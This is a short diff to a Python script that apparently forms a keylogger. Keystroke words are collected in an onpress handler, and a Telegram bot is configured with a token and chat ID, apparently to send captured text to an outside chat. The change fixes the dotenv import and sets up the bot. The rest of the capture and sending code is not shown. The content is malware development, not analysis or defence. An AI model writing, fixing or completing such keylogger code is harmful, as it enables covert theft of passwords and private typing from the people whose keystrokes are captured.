@@ -4,14 +4,17 @@ import requests
 import telebot
 import subprocess
 import os
-from dotenv import load_data
+from dotenv import load_dotenv
 
 
 todas_palavras = '' 
 cada_palavra = ''
 
-chat_id = os.getenv('chat_id')
-bot = os.getenv('bot_token')
+load_dotenv()
+
+bot_token = os.getenv('BOT_TOKEN')
+chat_id = os.getenv('CHAT_ID')
+bot = telebot.TeleBot(bot_token)
 
 def onpress(key):
     global cada_palavra
